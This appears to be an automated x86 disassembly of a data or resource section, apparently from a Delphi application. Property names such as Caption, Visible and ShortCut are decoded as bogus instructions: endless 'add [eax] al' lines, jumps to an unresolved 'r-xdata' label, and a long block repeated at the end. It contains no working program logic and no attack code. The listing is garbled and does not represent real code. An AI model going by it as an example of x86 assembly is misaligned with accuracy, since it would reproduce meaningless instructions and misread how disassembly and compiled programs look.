add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x5c656c62
iretd
add [ eax ] al
add [ eax + eax ] cl
inc esi
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000e ] al
outsb
inc edi
je r-xdata
int 0x46
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000b ] al
arpl [ gs : edi + 0x6e ] bp
clc
fadd [ eax + eax + 0x3c ]
call 0xffffffffe8aad222
inc esp
add [ eax + 0x44e8 ] bl
add [ edx - 0x1ae3ffbc ] dh
inc ecx
inc esp
popad
dec ecx
outsb
js r-xdata
imul ebp [ esi + 0x67 ] 0x6d490a01
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
jb r-xdata
add al bl
inc esi
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
je r-xdata
add [ esi * 2 - 0x2143ffbf ] al
inc esi
add [ esp + esi * 2 - 0x1f93ffbf ] bh
inc esi
jae r-xdata
add al 0x49
add [ eax ] al
mov ebx ss
inc esi
add [ eax + eax ] ch
outsb
je r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] 0xd2c0c08b
inc esi
add [ eax ] cl
or eax 0x74654754
dec ecx
je r-xdata
adc [ eax ] al
push es
dec edi
je r-xdata
push esi
popad
insb
jne r-xdata
push es
add eax 0x756c6156
add [ ecx + edi ] dl
je r-xdata
je r-xdata
add [ eax + 0x71 ] bh
inc ecx
add [ ecx + ebx * 8 + 0x46 ] ah
add [ eax ] dl
push esp
push ebx
je r-xdata
add ah bh
jo r-xdata
inc ecx
add [ eax + 0x46 ] ch
inc ebx
outsd
outsb
je r-xdata
jo r-xdata
insd
adc [ esp + ecx * 2 + 0x69 ] dl
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ ebx ] al
or [ esi ] al
insd
inc ebx
outsd
jne r-xdata
cmp [ eax ] eax
adc [ ecx ] bh
inc eax
add [ eax + 0x36 ] bl
push ebx
je r-xdata
push es
fadd [ eax + eax - 0x58 ]
in eax 0x44
add [ eax - 0x1b ] al
inc esp
add [ edx - 0x1ae3ffbc ] dh
inc ecx
add [ edx + ebp * 2 - 0x2393ffbf ] al
inc esi
loop r-xdata
insd
jae r-xdata
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
arpl [ esi + ebp * 2 + 0x73 ] si
add [ eax ] al
sbb ah dl
inc esi
add [ eax ] al
insb
into
inc esi
je r-xdata
loopne r-xdata
outsd
insb
dec ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 8 + 0x46 ] dl
inc ecx
add [ eax + esi * 2 + 0x41 ] ah
add [ eax ] al
jne r-xdata
add al [ 0x65646e49 ]
js r-xdata
push esp
inc ebx
jne r-xdata
jae r-xdata
je r-xdata
add [ eax ] dl
inc eax
add [ eax - 0x5f010000 ] ah
add [ eax + 0x110046e2 ] cl
push esp
push ebx
je r-xdata
xchg esp eax
aam 0x46
add [ edi ] al
adc [ ebx + edx * 2 + 0x74 ] edx
popad
je r-xdata
add [ eax + ebp * 8 - 0x1de7ffbc ] bh
inc esi
add [ eax - 0x3bffb91e ] dl
loop r-xdata
add [ eax + 0x400044e5 ] ch
in eax 0x44
add [ eax - 0x15 ] dh
inc ecx
add [ ebx + ebx * 8 - 0x187fffbc ] bl
inc esp
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax + 0x300046e1 ] cl
in al dx
inc ecx
add ah dl
jmp r-xdata
add [ 0x6a840041 ] bl
inc ecx
add [ esp + ebx * 8 + 0x46 ] ch
rol [ esi ] cl
inc esp
int 0x46
add [ ebx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add [ ecx + ebp * 8 ] dl
inc ecx
inc esi
add al ah
add [ eax ] al
add [ esi + ecx * 8 + 0x46 ] ch
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
adc al 0x39
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
inc ecx
fiadd [ esi ]
mov esp 0x6c004174
insd
lea eax [ eax ]
pushad
rol [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
rol [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
or [ ecx + ecx * 2 ] eax
dec ecx
outsb
cmp [ eax ] eax
pop eax
inc eax
je r-xdata
add [ esi + esi + 0x40 ] dh
add [ eax + esi * 2 ] cl
add [ eax + 0x36 ] bl
inc eax
outsd
and cl bl
inc esp
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
arpl [ ebp + 0x64 ] si
add [ fs : eax ] al
je r-xdata
add [ eax ] al
dec eax
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ eax ] al
add [ eax ] bl
aam 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
je r-xdata
add [ eax ] dl
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
pop es
inc ebx
popad
jo r-xdata
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
jae r-xdata
outsd
outsb
je r-xdata
jmp [ eax - 0x1d ]
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb ah dl
inc esi
add [ edi + ecx * 8 ] ch
inc esi
add [ edx ] dl
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add [ esi + esi + 0x40 ] dh
add al ch
push 0x1c0041e2
cmp [ eax ] eax
adc [ ecx ] bh
inc eax
insd
jae r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060008 ] al
insd
popad
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
call 0x7447165a
add [ eax ] al
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
enter 0x44e4 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
lodsb [ gs : esi ]
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
adc [ eax ] al
enter 0x0 0xff
or al 0xde
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
js r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
fadd [ esi ]
add [ eax ] eax
add [ eax ] al
adc [ eax ] al
mov al [ 0xffffffffa0ff0000 ]
add [ eax ] al
mov eax 0x80046cc
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 8 + 0x2c0046 ] cl
inc eax
add [ ebx + edx * 8 + 0x10070046 ] ah
push esp
push ebx
je r-xdata
insd
inc ebx
jne r-xdata
add [ eax ] al
inc [ eax ]
out 0x44 al
rol [ esi ] cl
rol [ eax ] 0x1
add bh bh
mov ah 0xe2
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905000a ] al
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
add eax 0x6d657449
lodsb [ esi ]
adc [ eax ] al
jl r-xdata
add [ eax + 0x36 ] bl
inc eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 8 + 0x280046 ] dh
add [ eax ] al
aam 0xd8
inc ebx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] al
0x42600041 0x44
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
and cl bl
inc esp
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
inc esi
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
dec ecx
je r-xdata
into
clc
fadd [ eax + eax + 0x3c ]
call 0xffffffffe8aad63d
inc esp
add [ eax + 0x44e8 ] bl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000c ] al
arpl [ gs : edi + 0x6e ] bp
add [ ecx ] 0x0
add [ eax ] al
or eax 0x69560700
jae r-xdata
jae r-xdata
insd
popad
jb r-xdata
adc dl [ ebx + 0x65 ]
arpl [ edi + 0x6e ] bp
xor al 0x41
add [ eax + eax - 0x19430100 ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
jmp [ eax + 0x10046dd ]
add bh bh
add dh ah
inc esp
loope r-xdata
arpl [ ecx + ebp * 2 + 0x73 ] cx
mov eax 0x4c0041e9
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
fld [ eax + eax - 0x78 ]
add [ eax ] al
dec [ eax + 0x1ff0000 ]
push ebx
push 0x4374726f
jne r-xdata
outsb
add [ esi ] al
bound ebp [ ebp - 0x44 ]
rol [ esi ] cl
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
outsb
inc edi
je r-xdata
0xeac00041 0x41
dec esp
nop
sbb al 0xd7
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
push es
jae r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
je r-xdata
adc [ eax ] al
xchg [ eax ] al
add bh bh
and bh ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x6e ] cl
push ebp
jo r-xdata
and al 0xce
insd
sub_46cb8e
inc esi
add [ edi ] al
dec ecx
je r-xdata
inc ebx
outsd
outsb
je r-xdata
outsb
je r-xdata
insd
outsd
insb
dec ecx
je r-xdata
adc al 0x39
outsd
insb
dec ecx
je r-xdata
add ecx [ eax ]
add al 0x4c
imul esi [ ebx + 0x74 ] 0x694c5411
jae r-xdata
outsd
jb r-xdata
jae r-xdata
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
insd
cmp al 0xcb
inc esi
add [ eax + 0x200413c ] dh
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
outsd
insb
dec ecx
je r-xdata
add [ esi * 2 + 0x75080041 ] al
inc ecx
mov al 0x3d
inc ecx
add [ eax ] cl
insd
jae r-xdata
cmp [ eax ] eax
inc ebx
outsd
jae r-xdata
push esp
jns r-xdata
adc [ eax ] al
adc [ eax ] al
add bh bh
and [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
pop es
inc ebx
popad
jo r-xdata
add [ eax + edx + 0x100040 ] ch
inc esi
add [ eax ] ah
add [ eax ] al
insd
jae r-xdata
jae r-xdata
add [ eax + 0x71 ] bh
inc ecx
add [ ecx + ebx * 8 + 0x46 ] ah
add [ ecx ] dl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
dec esp
add eax 0x6d657449
add [ eax + esi * 2 ] cl
inc ecx
inc eax
inc ebx
outsd
outsb
je r-xdata
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
int3
nop
imul ebp [ edi + 0x6e ] r-xdata
sbb [ eax ] al
add bh bh
sub [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add [ eax ] eax
or cl [ ecx + 0x6d ]
popad
dec ecx
outsb
js r-xdata
inc ecx
add [ ebx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
int 0x46
add [ eax + 0x3e ] al
inc ecx
jb r-xdata
inc ecx
arpl [ esi + ebp * 2 + 0x73 ] si
add eax [ eax ]
add [ eax ] dl
add [ eax - 0x80000000 ] al
add [ eax ] eax
or [ ebx + 0x6f ] dl
insb
dec ecx
je r-xdata
insb
dec ecx
je r-xdata
jo r-xdata
outsd
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
pop es
add al 0xcc
inc esi
add [ ebx ] al
adc dl [ esp + ecx * 2 + 0x69 ]
jae r-xdata
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or eax 0x65736143
push ebx
outsb
jae r-xdata
add [ eax ] al
adc [ eax ] al
sbb al 0x0
jb r-xdata
in al 0xcd
inc esi
add [ eax ] cl
adc dl [ edi + eax * 2 + 0x65 ]
je r-xdata
outsb
je r-xdata
je r-xdata
push esp
jns r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
insd
jae r-xdata
inc eax
add [ esi + esi + 0x40 ] dh
insd
or [ 0x6d657449 ] al
xor dl [ eax ]
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
dec eax
int 0x46
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ eax + esi * 2 + 0x41 ] ah
add [ eax ] al
dec ecx
je r-xdata
or [ edi ] al
inc ebx
push esp
inc ebx
jne r-xdata
je r-xdata
je r-xdata
add [ 0x6e756f43 ] eax
je r-xdata
push esp
inc ebx
jne r-xdata
jb r-xdata
jbe r-xdata
add [ ecx + ebx * 8 + 0x44 ] dl
add [ ecx + ebp * 8 ] dl
inc ecx
insd
dec ecx
dec esp
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ch cl
inc esi
add [ edi ] al
adc [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
ror [ eax - 0x33 ] 0x46
add [ eax ] cl
jne r-xdata
insb
dec ecx
je r-xdata
jmp [ eax ]
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
add [ ecx + edi ] dl
xor [ eax ] edx
push esp
insd
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
out 0x44 eax
outsd
inc ecx
add [ edx + ebp * 2 - 0x2393ffbf ] al
inc esi
add [ eax - 0x15 ] dh
inc ecx
add [ ebx + ebx * 8 - 0x187fffbc ] bl
inc esp
je r-xdata
add [ ecx + edi ] dl
inc eax
jbe r-xdata
inc ebp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
insd
inc ebx
outsd
jne r-xdata
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
inc ebp
nop
dec ecx
outsb
je r-xdata
add [ eax ] al
xor bh cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add ah cl
inc esi
add [ 0xffffffffa4ff0000 ] bl
fiadd [ esi ]
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ edx + 0x44 ] ah
add [ edx - 0x1ae3ffbc ] dh
outsb
add [ esp + esi * 2 + 0x74c00041 ] bh
inc ecx
add ah bh
jo r-xdata
jne r-xdata
insd
pop es
dec ecx
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or [ edi + 0x6e ] ecx
inc ebx
outsd
insd
jo r-xdata
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al cl
fiadd [ esi ]
xor ah ch
inc ecx
add ah dl
jmp r-xdata
outsd
insb
mov eax eax
mov eax 0x46ce
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
iretd
sbb al 0xe5
outsb
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
insb
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
iretd
jb r-xdata
add [ eax ] al
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
jb r-xdata
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
mov eax 0x340046ce
fiadd [ eax + eax + 0x3 ]
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add cl [ eax ]
jb r-xdata
push es
push ebx
outsb
jb r-xdata
je r-xdata
outsb
jbe r-xdata
jb r-xdata
push ebx
outsd
sub dh cl
inc esi
add [ eax ] cl
adc dl [ ecx + ecx * 2 + 0x74 ]
insd
inc eax
outsb
add [ bp + si ] ecx
dec ecx
insd
add [ ebp - 0x309fffc0 ] cl
inc esi
add [ eax ] cl
adc al 0x54
inc edi
je r-xdata
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add [ eax ] ch
add [ eax ] al
add [ eax + 0x800413d ] dh
inc eax
add [ ecx * 8 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
int 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
int 0x46
outsd
outsb
je r-xdata
outsb
je r-xdata
pop es
adc dl [ esi + edx * 2 + 0x69 ]
jb r-xdata
add [ esp + eax * 2 ] eax
dec ecx
outsb
je r-xdata
imul esi [ edx + 0x74 ] 0x496c6175
je r-xdata
inc esp
add [ eax ] bl
add [ eax ] al
[ eax ]
push eax
int3
jb r-xdata
add cl [ eax ]
push es
push ebx
outsb
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
call 0x7447125f
add [ eax ] al
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
jne r-xdata
add [ eax - 0x15 ] dh
inc ecx
add [ ebx + ebx * 8 - 0x187fffbc ] bl
inc esp
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al cl
fiadd [ esi ]
xor ah ch
inc ecx
add ah dl
jmp r-xdata
inc ecx
add [ esp + ebx * 8 + 0x46 ] ch
add [ esi + esi + 0x40 ] dh
add [ edx + 0x44 ] ah
pop es
push eax
outsd
imul ebp [ esi + 0x74 ] 0x408d7265
add [ eax ] ah
add [ edx + ebp * 2 - 0x2393ffbf ] al
inc esi
in eax 0x41
jb r-xdata
rol [ esi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
rol [ esi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x46
insd
inc ebp
jbe r-xdata
jae r-xdata
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
enter 0x44e4 0x0
add [ eax ] eax
insb
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
and al dl
inc esi
add [ edi + ecx * 8 ] ch
inc esi
add [ ecx ] dl
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
popad
je r-xdata
inc esp
add al 0x44
add [ eax ] al
add [ esi + ecx * 8 + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x46d0 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x27ffb930 ] al
outsb
je r-xdata
inc esp
add [ eax ] al
adc [ eax ] al
enter 0x0 0xff
or al 0xde
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
js r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
lodsb [ gs : esi ]
adc [ eax ] al
add [ fs : eax ] al
jmp [ eax - 0x1d ]
add [ eax ] al
adc [ eax ] al
mov al [ 0xffffffffa0ff0000 ]
fadd [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x65530608
outsb
jb r-xdata
into
inc esi
add al al
add [ eax ] al
push ebx
push 0x4374726f
jne r-xdata
popad
jb r-xdata
adc dl [ ebx + 0x65 ]
arpl [ edi + 0x6e ] bp
xor al 0x41
add [ eax + eax - 0x19430100 ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
jl r-xdata
add al [ 0x65646e49 ]
js r-xdata
push esp
inc ebx
jne r-xdata
je r-xdata
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
dec ecx
je r-xdata
rol [ eax ] 0x0
jae r-xdata
insd
loopne r-xdata
inc ebx
jne r-xdata
add bh bh
add dh ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
jmp [ eax + 0x10046dd ]
add [ 0x756c6156 ] eax
dec ecx
outsb
je r-xdata
add [ ecx + ebp * 8 ] dl
inc ecx
fadd [ eax ]
add [ eax ] al
insb
into
inc esi
je r-xdata
or al 0x70
jb r-xdata
inc ecx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
adc [ eax ] al
xchg [ eax ] al
add bh bh
and bh ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x5c656c62
iretd
add [ eax ] al
add [ eax + eax ] cl
inc esi
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000e ] al
outsb
inc edi
je r-xdata
int 0x46
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000b ] al
arpl [ gs : edi + 0x6e ] bp
clc
fadd [ eax + eax + 0x3c ]
call 0xffffffffe8aad222
inc esp
add [ eax + 0x44e8 ] bl
add [ edx - 0x1ae3ffbc ] dh
inc ecx
inc esp
popad
dec ecx
outsb
js r-xdata
imul ebp [ esi + 0x67 ] 0x6d490a01
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
jb r-xdata
add al bl
inc esi
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
je r-xdata
add [ esi * 2 - 0x2143ffbf ] al
inc esi
add [ esp + esi * 2 - 0x1f93ffbf ] bh
inc esi
jae r-xdata
add al 0x49
add [ eax ] al
mov ebx ss
inc esi
add [ eax + eax ] ch
outsb
je r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] 0xd2c0c08b
inc esi
add [ eax ] cl
or eax 0x74654754
dec ecx
je r-xdata
adc [ eax ] al
push es
dec edi
je r-xdata
push esi
popad
insb
jne r-xdata
push es
add eax 0x756c6156
add [ ecx + edi ] dl
je r-xdata
je r-xdata
add [ eax + 0x71 ] bh
inc ecx
add [ ecx + ebx * 8 + 0x46 ] ah
add [ eax ] dl
push esp
push ebx
je r-xdata
add ah bh
jo r-xdata
inc ecx
add [ eax + 0x46 ] ch
inc ebx
outsd
outsb
je r-xdata
jo r-xdata
insd
adc [ esp + ecx * 2 + 0x69 ] dl
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ ebx ] al
or [ esi ] al
insd
inc ebx
outsd
jne r-xdata
cmp [ eax ] eax
adc [ ecx ] bh
inc eax
add [ eax + 0x36 ] bl
push ebx
je r-xdata
push es
fadd [ eax + eax - 0x58 ]
in eax 0x44
add [ eax - 0x1b ] al
inc esp
add [ edx - 0x1ae3ffbc ] dh
inc ecx
add [ edx + ebp * 2 - 0x2393ffbf ] al
inc esi
loop r-xdata
insd
jae r-xdata
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
arpl [ esi + ebp * 2 + 0x73 ] si
add [ eax ] al
sbb ah dl
inc esi
add [ eax ] al
insb
into
inc esi
je r-xdata
loopne r-xdata
outsd
insb
dec ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 8 + 0x46 ] dl
inc ecx
add [ eax + esi * 2 + 0x41 ] ah
add [ eax ] al
jne r-xdata
add al [ 0x65646e49 ]
js r-xdata
push esp
inc ebx
jne r-xdata
jae r-xdata
je r-xdata
add [ eax ] dl
inc eax
add [ eax - 0x5f010000 ] ah
add [ eax + 0x110046e2 ] cl
push esp
push ebx
je r-xdata
xchg esp eax
aam 0x46
add [ edi ] al
adc [ ebx + edx * 2 + 0x74 ] edx
popad
je r-xdata
add [ eax + ebp * 8 - 0x1de7ffbc ] bh
inc esi
add [ eax - 0x3bffb91e ] dl
loop r-xdata
add [ eax + 0x400044e5 ] ch
in eax 0x44
add [ eax - 0x15 ] dh
inc ecx
add [ ebx + ebx * 8 - 0x187fffbc ] bl
inc esp
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax + 0x300046e1 ] cl
in al dx
inc ecx
add ah dl
jmp r-xdata
add [ 0x6a840041 ] bl
inc ecx
add [ esp + ebx * 8 + 0x46 ] ch
rol [ esi ] cl
inc esp
int 0x46
add [ ebx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add [ ecx + ebp * 8 ] dl
inc ecx
inc esi
add al ah
add [ eax ] al
add [ esi + ecx * 8 + 0x46 ] ch
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
adc al 0x39
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
inc ecx
fiadd [ esi ]
mov esp 0x6c004174
insd
lea eax [ eax ]
pushad
rol [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
rol [ esi ] cl
